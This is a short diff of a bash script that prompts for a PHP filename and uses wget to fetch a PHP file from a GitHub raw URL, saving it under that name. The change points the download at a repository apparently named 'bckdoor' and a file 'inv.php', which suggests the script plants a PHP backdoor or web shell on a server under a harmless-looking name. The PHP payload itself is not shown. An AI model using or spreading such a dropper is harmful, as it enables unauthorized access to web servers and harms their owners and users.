@@ -4,7 +4,7 @@
 read -p "Enter the filename for the PHP file (e.g., bps.php): " file_to_upload
 
 # Download file
-if wget "https://raw.githubusercontent.com/chuckyreply/xTRI_D/main/bps.php" -O "$file_to_upload"; then
+if wget "https://raw.githubusercontent.com/chuckyreply/bckdoor/refs/heads/main/inv.php" -O "$file_to_upload"; then
     echo "File downloaded successfully as $file_to_upload"
 else
     echo "Failed to download file"
